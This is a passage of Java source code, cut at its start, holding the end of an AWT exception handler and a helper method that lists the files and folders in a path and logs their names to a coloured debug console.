            } catch (AWTException e) {
            }
        }
    }
    //Folder & File Funcs
    public static void grabFilesInFolders(String path){
        try{
            File folder = new File(path);
            File[] listOfFiles = folder.listFiles();

            for (int i = 0; i < listOfFiles.length; i++) {
                if (listOfFiles[i].isFile()) {
                    debug.addLine("File " + listOfFiles[i].getName() + "\n", Color.ORANGE, 10, false);
                } else if (listOfFiles[i].isDirectory()) {
                    debug.addLine("Folder " + listOfFiles[i].getName() + "\n", Color.pink, 10, true);
                }
            }
        }catch(Exception e){
            debug.addLine("ERROR: Couldn't grab Directory of '" + path + "' info: " + e.toString() + "\n", Color.RED, 12, true);
        }
    }


}